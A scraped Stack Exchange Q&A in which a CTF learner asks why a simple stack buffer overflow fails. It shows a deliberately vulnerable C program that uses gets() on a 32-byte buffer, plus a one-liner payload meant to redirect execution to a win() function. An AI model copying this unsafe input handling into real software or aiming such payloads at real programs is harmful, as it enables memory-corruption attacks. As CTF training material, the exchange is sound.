{
    "title": "Basic Buffer Overflow Help",
    "link": "https://reverseengineering.stackexchange.com/questions/14944/basic-buffer-overflow-help",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am currently practicing for a CTF competition and one of the practice challenges is a buffer overflow exploit. Before this challenge I knew absolutely nothing about these exploits, but I've been reading into them and trying to understand the basics.\n </p>\n <pre><code>#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid win(void)\n{\n    system(\"cat flag.txt\");\n    return;\n}\n\n\nint main(int argc, char *argv[])\n{\n    printf(\"Give me some data: \n\");\n    fflush(stdout);\n    char buffer[32];\n    gets(buffer);\n    printf(\"You entered %s\n\", buffer);\n    fflush(stdout);\n    return 0;\n}\n</code></pre>\n <p>\n  So what I know so far is that I need to redirect to the\n  <code>\n   win()\n  </code>\n  function and that there is a buffer of 32 characters. I broke down the program into assembly and found that the\n  <code>\n   win()\n  </code>\n  function's address is\n  <code>\n   0x080484fd\n  </code>\n  . After that, I connected to the program's server and typed 32 characters and the function's address. The program only returned my input, and did not redirect to the\n  <code>\n   win()\n  </code>\n  function. I did some more reading and tried doing it from another shell with the command:\n </p>\n <pre><code>sudo python -c 'print \"a\"*32 + \"\\x08\\x04\\x84\\xfd\"' >& /dev/pts/2\n</code></pre>\n <p>\n  Sadly, this did not get me to the\n  <code>\n   win()\n  </code>\n  function. What am I doing wrong? I've hit a total block and not sure what else to try. Any advice and help would be greatly appreciated.\n </p>\n</div>\n</body></html>",
    "votes": "2",
    "answers": 1,
    "views": "2k",
    "tags": [
        "c",
        "exploit",
        "buffer-overflow"
    ],
    "user": "Mayo",
    "time": "Mar 19, 2017 at 13:53",
    "comments": [
        {
            "user": "julian",
            "text": "<html><body><span class=\"comment-copy\">\n have you read\n <a href=\"http://insecure.org/stf/smashstack.html\" rel=\"nofollow noreferrer\">\n  Smashing The Stack For Fun And Profit\n </a>\n ? it may help you think about how to approach this challenge. Also, have you tried using GDB to step through your code to see exactly what is happening? PS if your system is little-endian then memory addresses in the payload need to be written in little-endian fashion\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  You're doing well, with a little bit help you can exploit this program. First, let's look at stack layout for Linux (i assume it is Linux because of\n  <strong>\n   sudo\n  </strong>\n  and it is more common than other Unix-like OSes).\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/zgw0O.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"Linux stack layout\" src=\"https://i.sstatic.net/zgw0O.png\"/>\n  </a>\n </p>\n <p>\n  <strong>\n   old-EIP\n  </strong>\n  is not immediately after our buffer.\n </p>\n <p>\n  I compiled your program in my 32-bit Linux Mint and as you can see\nGCC throw security warning.\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/xEsF6.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"You can see GCC warning\" src=\"https://i.sstatic.net/xEsF6.jpg\"/>\n  </a>\n </p>\n <p>\n  Lets, prepare our exploit.\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/8BbSA.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Segfault\" src=\"https://i.sstatic.net/8BbSA.jpg\"/>\n  </a>\n </p>\n <p>\n  Segmentation fault, most probably EIP tried to execute wrong address. (Maybe because it is a CTF :)\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/v1dc6.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Exploiting buffer overflow\" src=\"https://i.sstatic.net/v1dc6.jpg\"/>\n  </a>\n  Program crashed again:\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/BGCag.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Crashed\" src=\"https://i.sstatic.net/BGCag.jpg\"/>\n  </a>\n </p>\n <p>\n  You can see we overwritten old-EBP value before old-EIP. We just need to find function symbol and smack the stack (old-EIP) value with that address.\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/SA8tl.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Exploit in action\" src=\"https://i.sstatic.net/SA8tl.jpg\"/>\n  </a>\n </p>\n <p>\n  I hope it made things little more clear for you.\n </p>\n <p>\n  Little security warning for you: Do not use\n  <strong>\n   sudo\n  </strong>\n  unless you need it.\n </p>\n</div>\n</body></html>",
            "votes": "4",
            "user": "Kerim Can Kalıpcıoğlu",
            "time": "Dec 5, 2020 at 19:07",
            "is_accepted": true,
            "comments": []
        }
    ]
}